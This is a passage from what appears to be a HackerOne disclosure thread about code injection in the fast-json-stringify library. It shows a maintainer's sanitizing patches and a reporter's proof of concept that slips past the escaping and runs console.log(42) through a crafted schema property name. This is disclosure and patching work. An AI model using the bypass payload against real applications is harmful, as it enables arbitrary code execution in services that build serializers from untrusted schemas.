class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ephra////\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e42\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003easd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e42\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewill produce the following JSON output, not compatible with the declared schema:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{\u0026quot;\\\u0026quot;\u0026#39;phra////\u0026quot;:42,\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;:\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003enotice that \u003ccode\u003eadditionalProperty\u003c/code\u003e was omitted and \u003ccode\u003easd\u003c/code\u003e won\u0026#39;t appear. however, the property named \u003ccode\u003e\u0026quot;\\\u0026#39;phra////\u003c/code\u003e will appear due to a wrong regex check in the generated code. here it is a diff of the two outputs:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e--- 1   2019-04-14 12:49:15.879552362 +0200\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ 2   2019-04-14 12:49:26.607563673 +0200\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -88,7 +88,7 @@\u003c/span\u003e\n       for (var i = 0; i \u0026lt; keys.length; i++) {\n         if (properties[keys[i]]) continue\n\n-        if (/\\//.test(keys[i])) {\n\u003cspan class=\"gi\"\u003e+        if (/\u0026quot;\u0026#39;w00t.*/.test(keys[i])) {\n\u003c/span\u003e\n\n   if (addComma) {\n\u003cspan class=\"p\"\u003e@@ -288,4 +288,4 @@\u003c/span\u003e\n     ;\n      return $main\n\n-{\u0026quot;\\\u0026quot;\u0026#39;phra////\u0026quot;:42,\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;:\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;,\u0026quot;now\u0026quot;:\u0026quot;2019-04-14T10:49:15.884Z\u0026quot;}\n\u003cspan class=\"gi\"\u003e+{\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;:\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;,\u0026quot;now\u0026quot;:\u0026quot;2019-04-14T10:49:26.612Z\u0026quot;}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003einstead the correct generated regex check should have been:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u0026quot;\u0026#39;w00t.*\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\\/\\/\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekeys\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-14T10:57:39.091Z","updated_at":"2019-04-14T11:12:24.859Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4559032,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please try:\n\n```\ndiff --git a/index.js b/index.js\nindex b6bbe4f..e7c603c 100644\n--- a/index.js\n+++ b/index.js\n@@ -2,6 +2,7 @@\n \n var Ajv = require('ajv')\n var merge = require('deepmerge')\n+var util = require('util')\n \n // This Ajv instance is used to validate that the passed schema\n // is valid json schema. We reuse the instance to avoid having to\n@@ -301,7 +302,7 @@ function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n-        if (/${regex}/.test(keys[i])) {\n+        if (/${regex.replace(/\\\\*\\//g, '\\\\/')}/.test(keys[i])) {\n     `\n     if (type === 'object') {\n       code += buildObject(pp[regex], '', 'buildObjectPP' + index, externalSchema, fullSchema)\n@@ -484,13 +485,17 @@ function refFinder (ref, schema, externalSchema) {\n       return idFinder(schema, `#${ref[1]}`)\n     } else {\n       for (var i = 1; i \u003c walk.length; i++) {\n-        code += `['${walk[i]}']`\n+        code += `['${sanitizeKey(walk[i])}']`\n       }\n     }\n   }\n   return (new Function('schema', code))(schema)\n }\n \n+function sanitizeKey (key) {\n+  return key.replace(/([^\\\\])\\'/g, '$1\\\\\\'') // eslint-disable-line\n+}\n+\n function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u003e {\n     if (schema.properties[key]['$ref']) {\n@@ -502,12 +507,14 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key).replace(/\\\\/g, '\\\\\\\\'))\n \n     if (nullable) {\n       code += `\n-        if (obj['${key}'] === null) {\n+        if (obj['${sanitized}'] === null) {\n           ${addComma}\n-          json += '${$asString(key)}:null'\n+          json += '${asString}:null'\n           var rendered = true\n         } else {\n       `\n@@ -515,10 +522,10 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     if (type === 'number') {\n       code += `\n-          var t = Number(obj['${key}'])\n+          var t = Number(obj['${sanitized}'])\n           if (!isNaN(t)) {\n             ${addComma}\n-            json += '${$asString(key)}:' + t\n+            json += '${asString}:' + t\n       `\n     } else if (type === 'integer') {\n       code += `\n@@ -526,25 +533,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n-            if (isLong(obj['${key}'])) {\n+            if (isLong(obj['${sanitized}'])) {\n               ${addComma}\n-              json += '${$asString(key)}:' + obj['${key}'].toString()\n+              json += '${asString}:' + obj['${sanitized}'].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj['${key}'])\n+              var t = Number(obj['${sanitized}'])\n               if (!isNaN(t)) {\n                 ${addComma}\n-                json += '${$asString(key)}:' + t\n+                json += '${asString}:' + t\n                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n-            var t = Number(obj['${key}'])\n+            var t = Number(obj['${sanitized}'])\n             if (!isNaN(t)) {\n               ${addComma}\n-              json += '${$asString(key)}:' + t\n+              json += '${asString}:' + t\n               rendered = true\n             }\n         `\n@@ -554,9 +561,9 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n-        if (obj['${key}'] !== undefined) {\n+        if (obj['${sanitized}'] !== undefined) {\n           ${addComma}\n-          json += '${$asString(key)}:'\n+          json += '${asString}:'\n         `\n \n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n@@ -569,12 +576,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n-        json += '${$asString(key)}:${JSON.stringify(defaultValue).replace(/'/g, '\\'')}'\n+        json += '${asString}:${sanitizeKey(JSON.stringify(defaultValue).replace(/\\\\/g, '\\\\\\\\'))}'\n       `\n     } else if (schema.required \u0026\u0026 schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error('${key} is required!')\n+        throw new Error('${sanitized} is required!')\n       `\n     }\n \n@@ -637,7 +644,7 @@ function addIfThenElse (schema, name, externalSchema, fullSchema) {\n   var merged = merge(copy, then)\n \n   code += `\n-    valid = ajv.validate(${require('util').inspect(i, { depth: null })}, obj)\n+    valid = ajv.validate(${util.inspect(i, { depth: null })}, obj)\n     if (valid) {\n   `\n   if (merged.if \u0026\u0026 merged.then) {\n@@ -835,6 +842,8 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var code = ''\n   var funcName\n \n+  subKey = subKey || ''\n+\n   if (schema.type === undefined) {\n     var inferedType = inferTypeByKeyword(schema)\n     if (inferedType) {\n@@ -845,7 +854,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n \n-  var accessor = key.indexOf('[') === 0 ? key : `['${key}']`\n+  var accessor = key.indexOf('[') === 0 ? sanitizeKey(key) : `['${sanitizeKey(key)}']`\n   switch (type) {\n     case 'null':\n       code += `\n@@ -881,7 +890,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n     case undefined:\n       if ('anyOf' in schema) {\n         schema.anyOf.forEach((s, index) =\u003e {\n-          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== undefined ? subKey : 'i' + index)\n+          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== '' ? subKey : 'i' + index)\n           code += `\n             ${index === 0 ? 'if' : 'else if'}(ajv.validate(${require('util').inspect(s, { depth: null })}, obj${accessor}))\n               ${nestedResult.code}\n```","markdown_message":"\u003cp\u003ePlease try:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/index.js b/index.js\nindex b6bbe4f..e7c603c 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/index.js\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/index.js\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -2,6 +2,7 @@\u003c/span\u003e\n\n var Ajv = require(\u0026#39;ajv\u0026#39;)\n var merge = require(\u0026#39;deepmerge\u0026#39;)\n\u003cspan class=\"gi\"\u003e+var util = require(\u0026#39;util\u0026#39;)\n\u003c/span\u003e\n // This Ajv instance is used to validate that the passed schema\n // is valid json schema. We reuse the instance to avoid having to\n\u003cspan class=\"p\"\u003e@@ -301,7 +302,7 @@\u003c/span\u003e function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n\u003cspan class=\"gd\"\u003e-        if (/${regex}/.test(keys[i])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (/${regex.replace(/\\\\*\\//g, \u0026#39;\\\\/\u0026#39;)}/.test(keys[i])) {\n\u003c/span\u003e     `\n     if (type === \u0026#39;object\u0026#39;) {\n       code += buildObject(pp[regex], \u0026#39;\u0026#39;, \u0026#39;buildObjectPP\u0026#39; + index, externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -484,13 +485,17 @@\u003c/span\u003e function refFinder (ref, schema, externalSchema) {\n       return idFinder(schema, `#${ref[1]}`)\n     } else {\n       for (var i = 1; i \u0026lt; walk.length; i++) {\n\u003cspan class=\"gd\"\u003e-        code += `[\u0026#39;${walk[i]}\u0026#39;]`\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        code += `[\u0026#39;${sanitizeKey(walk[i])}\u0026#39;]`\n\u003c/span\u003e       }\n     }\n   }\n   return (new Function(\u0026#39;schema\u0026#39;, code))(schema)\n }\n\n+function sanitizeKey (key) {\n\u003cspan class=\"gi\"\u003e+  return key.replace(/([^\\\\])\\\u0026#39;/g, \u0026#39;$1\\\\\\\u0026#39;\u0026#39;) // eslint-disable-line\n+}\n+\n\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u0026gt; {\n     if (schema.properties[key][\u0026#39;$ref\u0026#39;]) {\n\u003cspan class=\"p\"\u003e@@ -502,12 +507,14 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n\u003cspan class=\"gi\"\u003e+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key).replace(/\\\\/g, \u0026#39;\\\\\\\\\u0026#39;))\n\u003c/span\u003e\n     if (nullable) {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] === null) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] === null) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:null\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:null\u0026#39;\n\u003c/span\u003e           var rendered = true\n         } else {\n       `\n\u003cspan class=\"p\"\u003e@@ -515,10 +522,10 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     if (type === \u0026#39;number\u0026#39;) {\n       code += `\n\u003cspan class=\"gd\"\u003e-          var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e           if (!isNaN(t)) {\n             ${addComma}\n\u003cspan class=\"gd\"\u003e-            json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e       `\n     } else if (type === \u0026#39;integer\u0026#39;) {\n       code += `\n\u003cspan class=\"p\"\u003e@@ -526,25 +533,25 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n\u003cspan class=\"gd\"\u003e-            if (isLong(obj[\u0026#39;${key}\u0026#39;])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            if (isLong(obj[\u0026#39;${sanitized}\u0026#39;])) {\n\u003c/span\u003e               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + obj[\u0026#39;${key}\u0026#39;].toString()\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + obj[\u0026#39;${sanitized}\u0026#39;].toString()\n\u003c/span\u003e               rendered = true\n             } else {\n\u003cspan class=\"gd\"\u003e-              var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e               if (!isNaN(t)) {\n                 ${addComma}\n\u003cspan class=\"gd\"\u003e-                json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+                json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n\u003cspan class=\"gd\"\u003e-            var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e             if (!isNaN(t)) {\n               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e               rendered = true\n             }\n         `\n\u003cspan class=\"p\"\u003e@@ -554,9 +561,9 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] !== undefined) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] !== undefined) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:\u0026#39;\n\u003c/span\u003e         `\n\n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -569,12 +576,12 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n\u003cspan class=\"gd\"\u003e-        json += \u0026#39;${$asString(key)}:${JSON.stringify(defaultValue).replace(/\u0026#39;/g, \u0026#39;\\\u0026#39;\u0026#39;)}\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        json += \u0026#39;${asString}:${sanitizeKey(JSON.stringify(defaultValue).replace(/\\\\/g, \u0026#39;\\\\\\\\\u0026#39;))}\u0026#39;\n\u003c/span\u003e       `\n     } else if (schema.required \u0026amp;\u0026amp; schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n\u003cspan class=\"gd\"\u003e-        throw new Error(\u0026#39;${key} is required!\u0026#39;)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        throw new Error(\u0026#39;${sanitized} is required!\u0026#39;)\n\u003c/span\u003e       `\n     }\n\n@@ -637,7 +644,7 @@ function addIfThenElse (schema, name, externalSchema, fullSchema) {\n   var merged = merge(copy, then)\n\n   code += `\n\u003cspan class=\"gd\"\u003e-    valid = ajv.validate(${require(\u0026#39;util\u0026#39;).inspect(i, { depth: null })}, obj)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    valid = ajv.validate(${util.inspect(i, { depth: null })}, obj)\n\u003c/span\u003e     if (valid) {\n   `\n   if (merged.if \u0026amp;\u0026amp; merged.then) {\n\u003cspan class=\"p\"\u003e@@ -835,6 +842,8 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var code = \u0026#39;\u0026#39;\n   var funcName\n\n+  subKey = subKey || \u0026#39;\u0026#39;\n\u003cspan class=\"gi\"\u003e+\n\u003c/span\u003e   if (schema.type === undefined) {\n     var inferedType = inferTypeByKeyword(schema)\n     if (inferedType) {\n\u003cspan class=\"p\"\u003e@@ -845,7 +854,7 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n\n-  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? key : `[\u0026#39;${key}\u0026#39;]`\n\u003cspan class=\"gi\"\u003e+  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? sanitizeKey(key) : `[\u0026#39;${sanitizeKey(key)}\u0026#39;]`\n\u003c/span\u003e   switch (type) {\n     case \u0026#39;null\u0026#39;:\n       code += `\n\u003cspan class=\"p\"\u003e@@ -881,7 +890,7 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n     case undefined:\n       if (\u0026#39;anyOf\u0026#39; in schema) {\n         schema.anyOf.forEach((s, index) =\u0026gt; {\n\u003cspan class=\"gd\"\u003e-          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== undefined ? subKey : \u0026#39;i\u0026#39; + index)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== \u0026#39;\u0026#39; ? subKey : \u0026#39;i\u0026#39; + index)\n\u003c/span\u003e           code += `\n             ${index === 0 ? \u0026#39;if\u0026#39; : \u0026#39;else if\u0026#39;}(ajv.validate(${require(\u0026#39;util\u0026#39;).inspect(s, { depth: null })}, obj${accessor}))\n               ${nestedResult.code}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-14T22:32:12.793Z","updated_at":"2019-04-14T22:32:30.090Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4591067,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"i noticed that the current sanitize function can be bypassed with the following sequence: `\\\\\\'`\nhere is it a full poc, that will print the number 42 and produce an invalid JSON at the same time:\n\n```javascript\n'use strict'\n\nconst fastJson = require('.')\nconst stringify = fastJson({\n  title: 'Example Schema',\n  type: 'object',\n  properties: {\n    \"\\\"phra\\\\\\'\u0026\u0026(console.log(42))//||'phra\": {},\n  },\n})\n\nconsole.log(stringify({\n  '\"phra\\'\u0026\u0026(console.log(42))//||\\'phra': 42\n}))\n```","markdown_message":"\u003cp\u003ei noticed that the current sanitize function can be bypassed with the following sequence: \u003ccode\u003e\\\\\\\u0026#39;\u003c/code\u003e\u003cbr\u003e\nhere is it a full poc, that will print the number 42 and produce an invalid JSON at the same time:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003estringify\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eExample Schema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ephra\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;\u0026amp;\u0026amp;(console.log(42))//||\u0026#39;phra\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{},\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;phra\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026amp;\u0026amp;(console.log(42))//||\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ephra\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e42\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-18T12:01:12.452Z","updated_at":"2019-04-18T12:01:12.452Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4594853,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is another diff:\n\n```\ndiff --git a/index.js b/index.js\nindex b6bbe4f..3f1f15c 100644\n--- a/index.js\n+++ b/index.js\n@@ -2,6 +2,7 @@\n \n var Ajv = require('ajv')\n var merge = require('deepmerge')\n+var util = require('util')\n \n // This Ajv instance is used to validate that the passed schema\n // is valid json schema. We reuse the instance to avoid having to\n@@ -301,7 +302,7 @@ function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n-        if (/${regex}/.test(keys[i])) {\n+        if (/${regex.replace(/\\\\*\\//g, '\\\\/')}/.test(keys[i])) {\n     `\n     if (type === 'object') {\n       code += buildObject(pp[regex], '', 'buildObjectPP' + index, externalSchema, fullSchema)\n@@ -484,13 +485,17 @@ function refFinder (ref, schema, externalSchema) {\n       return idFinder(schema, `#${ref[1]}`)\n     } else {\n       for (var i = 1; i \u003c walk.length; i++) {\n-        code += `['${walk[i]}']`\n+        code += `['${sanitizeKey(walk[i])}']`\n       }\n     }\n   }\n   return (new Function('schema', code))(schema)\n }\n \n+function sanitizeKey (key) {\n+  return key.replace(/\\\\*\\'/g, '\\\\\\'') // eslint-disable-line\n+}\n+\n function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u003e {\n     if (schema.properties[key]['$ref']) {\n@@ -502,12 +507,14 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key).replace(/\\\\/g, '\\\\\\\\'))\n \n     if (nullable) {\n       code += `\n-        if (obj['${key}'] === null) {\n+        if (obj['${sanitized}'] === null) {\n           ${addComma}\n-          json += '${$asString(key)}:null'\n+          json += '${asString}:null'\n           var rendered = true\n         } else {\n       `\n@@ -515,10 +522,10 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     if (type === 'number') {\n       code += `\n-          var t = Number(obj['${key}'])\n+          var t = Number(obj['${sanitized}'])\n           if (!isNaN(t)) {\n             ${addComma}\n-            json += '${$asString(key)}:' + t\n+            json += '${asString}:' + t\n       `\n     } else if (type === 'integer') {\n       code += `\n@@ -526,25 +533,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n-            if (isLong(obj['${key}'])) {\n+            if (isLong(obj['${sanitized}'])) {\n               ${addComma}\n-              json += '${$asString(key)}:' + obj['${key}'].toString()\n+              json += '${asString}:' + obj['${sanitized}'].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj['${key}'])\n+              var t = Number(obj['${sanitized}'])\n               if (!isNaN(t)) {\n                 ${addComma}\n-                json += '${$asString(key)}:' + t\n+                json += '${asString}:' + t\n                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n-            var t = Number(obj['${key}'])\n+            var t = Number(obj['${sanitized}'])\n             if (!isNaN(t)) {\n               ${addComma}\n-              